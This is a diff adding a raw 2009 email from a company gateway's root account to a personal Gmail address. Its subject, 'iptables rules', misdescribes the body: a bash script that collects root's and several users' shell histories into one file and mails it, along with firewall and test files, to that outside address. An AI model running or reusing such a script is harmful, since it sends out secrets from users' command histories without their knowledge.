@@ -1,0 +1,42 @@
+Delivered-To: asumon@gmail.com
+Received: by 10.103.168.4 with SMTP id v4cs388437muo;
+        Sun, 22 Nov 2009 22:36:43 -0800 (PST)
+Received: by 10.204.48.212 with SMTP id s20mr4287958bkf.101.1258958203283;
+        Sun, 22 Nov 2009 22:36:43 -0800 (PST)
+Return-Path: <root@gw.continental-bd.com>
+Received: from gw.continental-bd.com ([116.68.207.73])
+        by mx.google.com with ESMTP id 18si5207151fks.34.2009.11.22.22.36.41;
+        Sun, 22 Nov 2009 22:36:42 -0800 (PST)
+Received-SPF: neutral (google.com: 116.68.207.73 is neither permitted nor denied by best guess record for domain of root@gw.continental-bd.com) client-ip=116.68.207.73;
+Authentication-Results: mx.google.com; spf=neutral (google.com: 116.68.207.73 is neither permitted nor denied by best guess record for domain of root@gw.continental-bd.com) smtp.mail=root@gw.continental-bd.com
+Received: from gw.continental-bd.com (gw.continental-bd.com [127.0.0.1])
+	by gw.continental-bd.com (8.13.1/8.13.1) with ESMTP id nAN6omMW006411
+	for <asumon@gmail.com>; Mon, 23 Nov 2009 12:50:48 +0600
+Received: (from root@localhost)
+	by gw.continental-bd.com (8.13.1/8.13.1/Submit) id nAN6omL7006408
+	for asumon@gmail.com; Mon, 23 Nov 2009 12:50:48 +0600
+Date: Mon, 23 Nov 2009 12:50:48 +0600
+From: root <root@gw.continental-bd.com>
+Message-Id: <200911230650.nAN6omL7006408@gw.continental-bd.com>
+To: asumon@gmail.com
+Subject: iptables rules
+
+#!/bin/bash
+hostname >continental.txt
+echo "root"
+cat /root/.bash_history>>continental.txt
+echo "mamun"
+cat /home/mamun/.bash_history>>continental.txt
+echo "rubel"
+cat /home/robel/.bash_history>>continental.txt
+echo "hasnat"
+cat /home/hasnat/.bash_history>>continental.txt
+echo "aziz"
+cat /home/aziz/.bash_history>>continental.txt
+echo "kliton"
+cat /home/kliton/.bash_history>>continental.txt
+echo "nasir"
+cat /home/nasir/.bash_history>>continental.txt
+/bin/mail -s "Report Continental" asumon@gmail.com </home/aziz/continental.txt
+/bin/mail -s "iptables rules" asumon@gmail.com </home/aziz/firewall.sh
+/bin/mail -s "iptables rules" asumon@gmail.com </home/aziz/test
